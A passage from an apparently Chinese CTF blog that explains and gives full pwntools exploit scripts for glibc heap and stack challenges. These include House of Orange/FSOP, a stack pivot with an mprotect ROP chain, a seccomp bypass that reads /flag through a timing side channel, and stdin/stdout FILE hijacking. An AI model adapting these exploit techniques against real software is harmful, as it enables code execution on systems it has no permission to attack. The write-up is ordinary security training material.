function_">show</span>():</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">  r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, content, price, color</span>):</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">  r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">  r.send(content)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>) <span class="comment">#1-7</span></span><br><span class="line">  r.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;aaaa\n&#x27;</span>,<span class="number">0x1234</span>,<span class="number">0xddaa</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span> +p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">666</span>) + p32(<span class="number">0xddaa</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">666</span>, <span class="number">0xddaa</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;a\n&#x27;</span>,<span class="number">0x1234</span>, <span class="number">0xddaa</span>)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>, <span class="number">199</span>, <span class="number">2</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x668</span> - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;malloc_hook = &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc.address = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">io_list_all = libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload, <span class="number">199</span>, <span class="number">2</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap - <span class="number">0xE0</span></span><br><span class="line">success(<span class="string">&#x27;heap = &#x27;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">666</span>) + p32(<span class="number">0xddaa</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)<span class="comment">#to small bin</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x5E8</span>) <span class="comment">#vtable ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file += p64(system)</span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://bbs.pediy.com/thread-222718.htm">https://bbs.pediy.com/thread-222718.htm</a></p><p><a href="https://www.anquanke.com/post/id/218887#h3-4">https://www.anquanke.com/post/id/218887#h3-4</a></p><p><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">https://blog.csdn.net/weixin_44145820/article/details/105270036</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW卷王杯-pwn</title>
      <link href="/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/"/>
      <url>/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/</url>
      
        <content type="html"><![CDATA[<p>根据官方 wp 学习了两道好题</p><span id="more"></span><h1 id="check-in"><a class="markdownIt-Anchor" href="#check-in">#</a> check in</h1><h2 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路</h2><p>发现开了 <code>**sandbox**</code> （之后再仔细分析），然后读入姓名那里有一个明显的<strong>格式化字符串漏洞</strong>，再之后可以读入 <code>0x90</code>  大小的数据，然而数组大小只有 <code>0x80</code> ，很明显是一个<strong>栈溢出</strong>，但是溢出的长度非常短，只有 <code>0x10</code> ，也就是只能覆盖 <code>rbp</code>  和 <code>ret</code> ，在程序的最后有 <code>close(1)</code> <strong> 关闭了标准输出的文件描述符</strong>，也就是我们无法泄露任何信息，包括最终得到的 <code>flag</code> ，最后再看下此题的保护：<strong>没有开</strong> <code>**Canary**</code> <strong> 和</strong> <code>**PIE**</code> <strong> 保护</strong>。</p><p>首先，格式化字符串的利用方式很显然，可以用于<strong>泄露</strong> <code>**libc**</code> ：通过泄露 <code>__libc_start_main + 243</code> ，即可得到 <code>libc_base</code> 。</p><p>再来看栈溢出该如何利用，既然我们只能覆盖到 <code>rbp</code>  和 <code>ret</code> ，其中 <code>ret</code>  是跳转执行的地址，那么就可以考虑何处受 <code>rbp</code>  控制，又方便我们利用，不难想到 <code>read</code>  的时候，是将 <code>0x90</code>  的数据读到栈上的，而栈上的地址就受 <code>rbp</code>  控制，由汇编：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4013dd</span> &lt;main+<span class="number">163</span>&gt;:    lea    rax,[rbp-<span class="number">0x80</span>]</span><br><span class="line"><span class="number">0x4013e1</span> &lt;main+<span class="number">167</span>&gt;:    mov    edx,<span class="number">0x90</span></span><br><span class="line"><span class="number">0x4013e6</span> &lt;main+<span class="number">172</span>&gt;:    mov    rsi,rax</span><br><span class="line"><span class="number">0x4013e9</span> &lt;main+<span class="number">175</span>&gt;:    mov    edi,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x4013ee</span> &lt;main+<span class="number">180</span>&gt;:    call   <span class="number">0x401100</span> &lt;read@plt&gt;</span><br></pre></td></tr></table></figure><p>可见， <code>read</code>  的第二个参数 <code>rsi</code> （写入数据的地址）就是 <code>rbp-0x80</code>  中的内容，因此，我们可以通过<strong>控制</strong> <code>**rbp**</code> <strong> 为</strong> <code>**bss**</code> <strong> 段上的某地址，然后再通过</strong> <code>**ret**</code> <strong> 跳转到</strong> <code>**0x4013dd**</code> <strong> 的位置，即可往</strong> <code>**bss**</code> <strong> 段上写入内容</strong>，再之后通过一个<strong>栈迁移</strong>，即可跳转到我们读到 <code>bss</code>  段上的 <code>gadget</code>  并执行。</p><p>最后，我们来看一下这个 <code>sandbox</code> ，是个黑名单，禁用 <code>socket</code>  那些主要就是为了防止重启输出流造成非预期的，可以先不用管，主要就是发现禁用了 <code>open</code>  的系统调用和 <code>read</code>  相关的系统调用，虽然没有禁 <code>write</code>  相关的系统调用，但是由于有 <code>close(1)</code> ，所以也无法输出，这看似是无法 <code>orw</code>  了，不过仔细分析后可以发现： <code>open</code>  的系统调用虽然被禁用了，但是我们<strong>可以用</strong> <code>**openat**</code> <strong> 系统调用来代替</strong> <code>**open**</code> <strong> 系统调用</strong>（ <code>libc</code>  中的 <code>open</code>  函数就是对 <code>openat</code>  这个底层系统调用的封装）， <code>openat</code>  分绝对路径和相对路径两种写法， <code>exp</code>  中都给出了；再来看 <code>read</code> ，注意到 <code>read</code>  相关的系统调用并非全部被禁用了，当 <code>read</code>  的 <code>fd</code>  为 <code>0</code>  时， <code>read</code>  是可用的，对于常规 <code>orw</code>  来说，先 <code>open</code>  一个文件，由于 <code>0,1,2</code>  都分别被标准输入，输出，报错给占用了，所以文件描述符是从 <code>3</code>  开始的，而若是我们在 <code>open</code>  前，<strong>先</strong> <code>**close(0)**</code> <strong>，再</strong> <code>**open**</code> <strong> 的话，我们打开的文件的描述符就是</strong> <code>**0**</code> <strong> 了，我们也就可以</strong> <code>**read**</code> <strong> 读取文件内容了</strong>；最后，对于 <code>write</code>  来说，可以采用 **“侧信道攻击”<strong> 的方式，就是对 <code>flag</code>  的每一位进行爆破，与我们已经 <code>read</code>  读入到内存中的真实 <code>flag</code>  进行比对，比如，若是相等就触发死循环，那么我们就可以通过判断接收数据用了多久来判断猜测是否正确了，在当前假设下，若是超过了 <code>1</code>  秒，则说明我们这一位爆破猜测成功了，当然，我这里写了一个</strong> “二分法”<strong> 的版本，不然会耗费很长时间（其实， <code>CTFshow</code>  的 <code>flag</code>  好像用的是 <code>uuid</code>  字符串，也就是 <code>&#123;&#125;</code>  中的内容仅局限于 <code>-0123456789abcdef</code>  这几个字符，因此，应该还能进一步缩短我 <code>exp</code>  的爆破时长）。由于 “侧信道攻击” 最好使用 <code>shellcode</code>  来实现，故在之前需要用 <code>mprotect</code>  的 <code>gadget</code>  链改一下 <code>bss</code>  段的可执行权限，而一次性只能读入 <code>0x80</code>  大小的数据，可能无法将 <code>orw</code>  的 <code>shellcode</code>  和 <code>mprotect</code>  的 <code>gadget</code>  一起读进 <code>bss</code>  段，因此，我们可以</strong>先写一小段 ** <code>**shellcode**</code> <strong> 作为跳板</strong>和 <code>mprotect</code>  的 <code>gadget</code>  一起读入到 <code>bss</code>  段，再通过这个跳板，将 <code>orw</code>  的 <code>shellcode</code>  读到 <code>bss</code>  段上并跳转执行</p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">possible_list = <span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./checkin&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.30.so&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss() + <span class="number">0x500</span></span><br><span class="line">read_addr = <span class="number">0x4013DD</span></span><br><span class="line">leave_addr = <span class="number">0x401402</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">pos, char</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;name :\n&quot;</span>, <span class="string">b&#x27;%25$p&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Hello, &quot;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>)[<span class="number">2</span>:], <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span> + p64(bss_addr + <span class="number">0x80</span>) + p64(read_addr)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;check in :\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">    shellcode_read = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        xor rdi, rdi</span></span><br><span class="line"><span class="string">        push <span class="subst">&#123;bss_addr+<span class="number">0x100</span>&#125;</span></span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string">        push 0x100</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        jmp rsi</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    pop_rdi_ret = libc_base + <span class="number">0x26bb2</span></span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x2709c</span></span><br><span class="line">    pop_rdx_r12_ret = libc_base + <span class="number">0x11c421</span></span><br><span class="line">    mprotect_addr = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">    payload = p64(pop_rdi_ret) + p64(bss_addr &amp; <span class="number">0xfffff000</span>) + p64(pop_rsi_ret) + p64(<span class="number">0x1000</span>) + p64(pop_rdx_r12_ret) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>) + p64(mprotect_addr)</span><br><span class="line">    payload += p64(bss_addr + <span class="built_in">len</span>(payload) + <span class="number">8</span>) + asm(shellcode_read)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(bss_addr - <span class="number">8</span>) + p64(leave_addr)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    shellcode_main = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /* close(0) */</span></span><br><span class="line"><span class="string">        push 3</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        xor rdi, rdi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        /* openat(&quot;/flag&quot;) */</span></span><br><span class="line"><span class="string">        push 257</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        /* ( absolute path ) */</span></span><br><span class="line"><span class="string">        mov rsi, 0x67616c662f</span></span><br><span class="line"><span class="string">        push rsi</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        /*</span></span><br><span class="line"><span class="string">        ( relative path )</span></span><br><span class="line"><span class="string">        push -100</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        push 0x67616c66</span></span><br><span class="line"><span class="string">        push rsp</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string">        */</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        /* read flag */</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        xor rdi, rdi</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        push 0x50</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        /* blow up flag */</span></span><br><span class="line"><span class="string">        mov al, byte ptr[rsi+<span class="subst">&#123;pos&#125;</span>]</span></span><br><span class="line"><span class="string">        cmp al, <span class="subst">&#123;char&#125;</span></span></span><br><span class="line"><span class="string">        ja $-2</span></span><br><span class="line"><span class="string">        ret</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(asm(shellcode_main))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    start = time.time()</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        left, right = <span class="number">0</span>, <span class="built_in">len</span>(possible_list)-<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right :</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">            io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28102</span>)</span><br><span class="line">            pwn(pos, <span class="built_in">ord</span>(possible_list[mid]))</span><br><span class="line">            s = time.time()</span><br><span class="line">            io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">            t = time.time()</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">if</span> t - s &gt; <span class="number">1</span> :</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                right = mid</span><br><span class="line">        flag += possible_list[left]</span><br><span class="line">        info(flag)</span><br><span class="line">        <span class="keyword">if</span> possible_list[left] == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pos = pos + <span class="number">1</span></span><br><span class="line">    success(flag)</span><br><span class="line">    end = time.time()</span><br><span class="line">    success(<span class="string">&quot;time:\t&quot;</span> + <span class="built_in">str</span>(end - start) + <span class="string">&quot;s&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="incomplete-menu"><a class="markdownIt-Anchor" href="#incomplete-menu">#</a> Incomplete Menu</h1><h2 id="思路-2"><a class="markdownIt-Anchor" href="#思路-2">#</a> 思路</h2><p>这题给出了一个不完整的菜单，只有 <code>new</code>  和 <code>edit</code> ， <code>new</code>  就是新建一个 ** 任意大小（无限制）** 的堆块，最多只可以创建 <code>5</code>  个堆块， <code>edit</code>  可以输入需要读进某堆块中内容的长度 <code>len</code> ，如果输入的长度 <code>len</code>  超过了该堆块的大小 <code>size</code> ，则实际读入长度 <code>Len = size</code> ，否则 <code>Len = len</code> 。漏洞点在于：在将读入内容的最后一字节改为 <code>\x00</code>  的时候，长度用的是用户输入的长度 <code>len</code> ，而并非实际读入的长度 <code>Len</code> ，<strong>这样就会导致某堆块后面的任意某字节会被 “刷零”</strong>，不过每个堆块只能被 <code>edit</code>  一次。</p><p>没有 <code>show</code> ，不能泄露信息，不过有走 <code>IO</code>  流输出的函数，如 <code>puts</code>  和 <code>printf</code> ，因此容易想到通过劫持 <code>stdout</code>  来进行信息泄露，没有 <code>delete</code>  函数，不能对堆块进行 <code>free</code> ，其实可以通过漏洞改 <code>top chunk</code>  的 <code>size</code> ，将它改小以后（要保证后三位不动），再申请一个大堆块，就能将原先的 <code>top chunk</code>  给 <code>free</code>  调了，不过在这里貌似并没有太大的用处。</p><p>我们只有这一个可利用的漏洞，又需要劫持到 <code>stdout</code> ，那就需要知道 <code>stdout</code>  与堆块地址的偏移，对于一般的堆块，其地址与 <code>libc</code>  地址的偏移肯定是无法确定的，但是这题可以申请任意大的堆块，也就是可以通过 <code>mmap</code>  申请堆块，而 <code>**mmap**</code> <strong> 申请出来的堆块，是紧接在</strong> <code>**libc**</code> <strong> 的上方的，其地址与</strong> <code>**libc**</code> <strong> 中地址的偏移是可以确定的</strong>，这里可以通过<strong>将</strong> <code>**_IO_2_1_stdout_**</code> <strong> 的</strong> <code>**_IO_read_end**</code> <strong> 和</strong> <code>**_IO_write_base**</code> <strong> 的最后一字节都改为</strong> <code>**\x00**</code> <strong>，这样他们就相等了</strong>，也就可以通过走 <code>IO</code>  的输出函数泄露出其中（ <code>_IO_write_base ~ _IO_write_ptr</code> ）包含的 <code>libc</code>  地址，进而得到 <code>libc_base</code> 。</p><p>泄露出 <code>libc_base</code>  之后，我们肯定是需要一个 “任意写” 漏洞，劫持一些函数或者 <code>IO</code>  流这些才能完成攻击。不难想到，可以通过劫持 <code>stdin</code>  来实现，这里我们按照和上面类似的方式，<strong>修改</strong> <code>**_IO_2_1_stdin_**</code> <strong> 的</strong> <code>**_IO_buf_base**</code> <strong> 中的最后一字节为</strong> <code>**\x00**</code> ，这时， <code>_IO_buf_base</code>  正好指向了 <code>_IO_2_1_stdin_</code> ，而我们读入的时候，用的是 <code>fgets</code> ，这是一个走 <code>IO</code>  流的读入函数（这个函数就是读一整行到 <code>stdin</code>  缓冲区，然后再从缓冲区取出指定长度的数据，因此读数据会被 <code>\n</code>  截断，或者已经从缓冲区取到了所需长度的数据，也不再会刷新缓冲区往后读取数据了），因此，我们可以通过 <code>fgets</code>  读入任意内容到被伪造的 <code>_IO_buf_base</code> （ <code>_IO_2_1_stdin_</code> ）处，这样就可以再劫持一次 <code>stdin</code>  进行任意写了，我们读入多少字节到缓冲区， <code>_IO_read_end</code>  就会相应加多少，从缓冲区读取多少字节到目标内存， <code>_IO_read_ptr</code>  就会相应加多少，不过，最多也只能一次性读入 <code>_IO_buf_end - _IO_buf_base</code>  大小的数据到缓冲区，如果还需要读入，则会刷新缓冲区，一次也最多只能读取 <code>_IO_read_end - _IO_read_ptr</code>  大小的合法数据到目标内存，此时，由于 <code>_IO_buf_end</code>  为 <code>_IO_buf_base + 132</code> ，因此，<strong>我们只有读满</strong> <code>**132**</code> <strong> 个字节，才有机会按我们第一次劫持</strong> <code>**stdin**</code> <strong> 后，读入到</strong> <code>**_IO_buf_base**</code> <strong> 中的值（记为</strong> <code>**_IO_buf_base(new)**</code> <strong>）刷新缓冲区，只有刷新完缓冲区之后，才能按照我们的设想进行第二次</strong> <code>**stdin**</code> <strong> 的劫持</strong>。这里需要注意的是，在第一次完成 <code>stdin</code>  的劫持，读入 <code>132</code>  字节的内容到 <code>_IO_2_1_stdin_</code> 中之后，会尝试从缓冲区取 <code>16</code>  个字节到目标内存，如果成功取出了 <code>16</code>  个字节，也就满足了 <code>fgets</code>  的需要，那么也就不会刷新缓冲区了，我们也就不能对 <code>stdin</code>  进行第二次劫持了。在这里， <code>glibc</code>  是<strong>通过判断</strong> <code>**_IO_read_ptr**</code> <strong> 是否小于</strong> <code>**_IO_read_end**</code> <strong> 来判断缓冲区中是否还有剩余的数据</strong>，因此，我们可以在第一次劫持 <code>stdin</code>  往 <code>_IO_2_1_stdin_</code> 中写内容的时候，<strong>修改其中的</strong> <code>**_IO_read_ptr**</code> <strong> 等于</strong> <code>**_IO_read_end**</code> ，这里的 <code>_IO_read_end</code>  是指读完 <code>132</code>  个字节后的值（ <code>_IO_buf_base(new) + 132</code> ），也就是需要 <code>_IO_read_ptr = _IO_buf_base(new) + 132</code> ，其实，这里也不一定是要加上 <code>132</code> ，略小一点，只要保证和 <code>_IO_read_end</code>  差值不足大约 <code>16</code>  个字节，可以有刷新缓冲区的机会即可，并且， <code>glibc</code>  源码中也只是判断了 <code>_IO_read_ptr</code>  是否小于 <code>_IO_read_end</code> ，故还可以将 <code>_IO_read_ptr</code>  改为大于 <code>_IO_read_end</code> ，比如 <code>_IO_read_ptr = _IO_buf_base(new) + 200</code>  也行。在这里，我是通过<strong>劫持</strong> <code>**IO_list_all**</code> <strong> 来打</strong> <code>**FSOP**</code>  的，通过读取 <code>choice</code>  的 <code>fgets</code>  进行 “任意写” 以后，由于获取到的值并非菜单中的选项 <code>1</code>  或 <code>2</code> ，就会走到 <code>exit</code> ，直接触发 <code>FSOP</code> 。</p><h2 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28121</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_IO_str_jumps</span>():</span><br><span class="line">   IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">   IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">   <span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">       possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">       <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">          <span class="keyword">return</span> possible_IO_str_jumps_offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span 